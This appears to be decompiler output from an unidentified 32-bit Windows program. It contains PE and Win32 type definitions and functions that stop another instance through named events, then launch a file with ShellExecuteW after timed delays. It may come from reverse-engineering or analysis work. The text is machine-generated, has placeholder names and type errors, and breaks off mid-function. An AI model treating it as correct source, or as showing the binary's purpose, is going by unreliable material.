typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

struct _s_ESTypeList {
    int nCount;
    HandlerType *pTypeArray;
};

typedef struct _s_ESTypeList ESTypeList;

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
    ESTypeList *pESTypeList;
    int EHFlags;
};

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

typedef long LONG;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef int INT_PTR;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef WCHAR *LPWCH;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR SIZE_T;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef void *LPCVOID;

typedef struct HRSRC__ *HRSRC;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;




void FUN_00401000(void)

{
  short sVar1;
  short *psVar2;
  short *psVar3;
  int iVar4;
  int unaff_EDI;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_20c;
  local_20c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_20a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  psVar2 = FUN_0040a991(&local_20c,0x5c);
  *psVar2 = 0;
  psVar2 = psVar2 + 1;
  psVar3 = FUN_0040a991(psVar2,0x2e);
  *psVar3 = 0;
  iVar4 = unaff_EDI - (int)psVar2;
  do {
    sVar1 = *psVar2;
    *(short *)(iVar4 + (int)psVar2) = sVar1;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  FUN_0040a982(local_4 ^ (uint)&local_20c,iVar4);
  return;
}



void FUN_004010a0(HINSTANCE param_1,undefined4 param_2,short *param_3)

{
  ushort uVar1;
  short sVar2;
  ushort *puVar3;
  DWORD DVar4;
  ushort *puVar5;
  int iVar6;
  bool bVar7;
  undefined8 uVar8;
  WCHAR WStack_218;
  undefined auStack_216 [522];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&WStack_218;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_00424648,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_00424580,100);
  FUN_00401290();
  iVar6 = (int)&DAT_00425150 - (int)param_3;
  do {
    sVar2 = *param_3;
    *(short *)(iVar6 + (int)param_3) = sVar2;
    param_3 = param_3 + 1;
  } while (sVar2 != 0);
  DAT_00423070 = FUN_00403830();
  puVar5 = &DAT_0041dc68;
  puVar3 = &DAT_00425150;
  do {
    uVar1 = *puVar3;
    bVar7 = uVar1 < *puVar5;
    if (uVar1 != *puVar5) {
LAB_00401139:
      iVar6 = (1 - (uint)bVar7) - (uint)(bVar7 != 0);
      goto LAB_0040113e;
    }
    if (uVar1 == 0) break;
    uVar1 = puVar3[1];
    bVar7 = uVar1 < puVar5[1];
    if (uVar1 != puVar5[1]) goto LAB_00401139;
    puVar3 = puVar3 + 2;
    puVar5 = puVar5 + 2;
  } while (uVar1 != 0);
  iVar6 = 0;
LAB_0040113e:
  if (iVar6 != 0) {
    iVar6 = FUN_00401c70();
    if (iVar6 != 0) {
      FUN_00403bf0();
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
  }
  uVar8 = FUN_00401320(param_1);
  if ((int)uVar8 == 0) {
    FUN_0040a982(local_c ^ (uint)&WStack_218,(int)((ulonglong)uVar8 >> 0x20));
    return;
  }
  LoadAcceleratorsW(param_1,(LPCWSTR)0x6d);
  WStack_218 = L'\0';
  FUN_0040f8c0((undefined (*) [16])auStack_216,0,0x206);
  if ((DAT_00424d98 != 0) && (DAT_00424d9c != 0)) {
    FUN_004037b0(DAT_00424d98);
    DAT_0042361c = DAT_00424d9c;
  }
  GetTickCount();
  FUN_00402fe0(1000,(undefined2 *)&DAT_00425360,0x41dc70);
  Sleep(1000);
  FUN_00402d00();
  FUN_00403000();
  FUN_0040a9bd(&WStack_218,0x104,(short *)&DAT_0041dc88);
  FUN_0040a9bd(&WStack_218,0x104,(short *)&DAT_00425360);
  DVar4 = GetFileAttributesW(&WStack_218);
  if (DVar4 != 0xffffffff) {
    Sleep(500);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&WStack_218,&DAT_0041de30,(LPCWSTR)0x0,1);
  }
  Sleep(5000);
  FUN_00402a60();
  FUN_00403bf0();
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_00401290(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_34;
  
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_00401800;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.hInstance = in_EAX;
  local_34.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)&DAT_00000006;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_00424580;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401320(HINSTANCE param_1)

{
  ushort uVar1;
  short sVar2;
  int iVar3;
  undefined4 uVar4;
  undefined2 uVar5;
  undefined4 *puVar6;
  HWND pHVar7;
  ushort *puVar8;
  int iVar9;
  HANDLE pvVar10;
  DWORD DVar11;
  undefined4 *puVar12;
  ushort *puVar13;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar14;
  bool bVar15;
  undefined auStack_c00 [404];
  short sStack_a6c;
  undefined auStack_a6a [58];
  WCHAR WStack_a30;
  undefined auStack_a2e [518];
  WCHAR WStack_828;
  undefined auStack_826 [518];
  undefined2 uStack_620;
  undefined auStack_61e [516];
  undefined4 uStack_41a;
  undefined auStack_416 [518];
  WCHAR WStack_210;
  undefined auStack_20e [522];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_c00;
  DAT_00424710 = param_1;
  pHVar7 = CreateWindowExW(0,(LPCWSTR)&DAT_00424580,(LPCWSTR)&DAT_00424648,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  uVar14 = extraout_EDX;
  if (pHVar7 != (HWND)0x0) {
    WStack_210 = L'\0';
    FUN_0040f8c0((undefined (*) [16])auStack_20e,0,0x206);
    WStack_a30 = L'\0';
    FUN_0040f8c0((undefined (*) [16])auStack_a2e,0,0x206);
    uStack_620 = 0;
    FUN_0040f8c0((undefined (*) [16])auStack_61e,0,0x206);
    GetModuleFileNameW((HMODULE)0x0,&WStack_210,0x104);
    puVar13 = &DAT_0041dc68;
    puVar8 = &DAT_00425150;
    do {
      uVar1 = *puVar8;
      bVar15 = uVar1 < *puVar13;
      if (uVar1 != *puVar13) {
LAB_0040141d:
        iVar9 = (1 - (uint)bVar15) - (uint)(bVar15 != 0);
        goto LAB_00401422;
      }
      if (uVar1 == 0) break;
      uVar1 = puVar8[1];
      bVar15 = uVar1 < puVar13[1];
      if (uVar1 != puVar13[1]) goto LAB_0040141d;
      puVar8 = puVar8 + 2;
      puVar13 = puVar13 + 2;
    } while (uVar1 != 0);
    iVar9 = 0;
LAB_00401422:
    if (iVar9 != 0) {
      WStack_828 = L'\0';
      FUN_0040f8c0((undefined (*) [16])auStack_826,0,0x206);
      uStack_41a._2_2_ = 0;
      FUN_0040f8c0((undefined (*) [16])auStack_416,0,0x206);
      iVar9 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0041dc8c + iVar9);
        *(short *)(auStack_826 + iVar9 + -2) = sVar2;
        iVar9 = iVar9 + 2;
      } while (sVar2 != 0);
      iVar9 = 0;
      do {
        iVar3 = iVar9 + -2;
        *(short *)(auStack_416 + iVar9 + -2) = *(short *)(auStack_826 + iVar3);
        iVar9 = iVar9 + 2;
      } while (*(short *)(auStack_826 + iVar3) != 0);
      puVar6 = &uStack_41a;
      do {
        puVar12 = puVar6;
        puVar6 = (undefined4 *)((int)puVar12 + 2);
      } while (*(short *)((int)puVar12 + 2) != 0);
      *(undefined4 *)((int)puVar12 + 2) = u__STOP_0041dc9c._0_4_;
      *(undefined4 *)((int)puVar12 + 6) = u__STOP_0041dc9c._4_4_;
      *(undefined4 *)((int)puVar12 + 10) = u__STOP_0041dc9c._8_4_;
      pvVar10 = OpenEventW(0x20000,0,&WStack_828);
      if (pvVar10 != (HANDLE)0x0) {
        CloseHandle(pvVar10);
        CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_41a + 2));
        pvVar10 = OpenEventW(0x20000,0,&WStack_828);
        for (iVar9 = 0; (pvVar10 != (HANDLE)0x0 && (iVar9 < 5)); iVar9 = iVar9 + 1) {
          CloseHandle(pvVar10);
          Sleep(200);
          pvVar10 = OpenEventW(0x20000,0,&WStack_828);
        }
      }
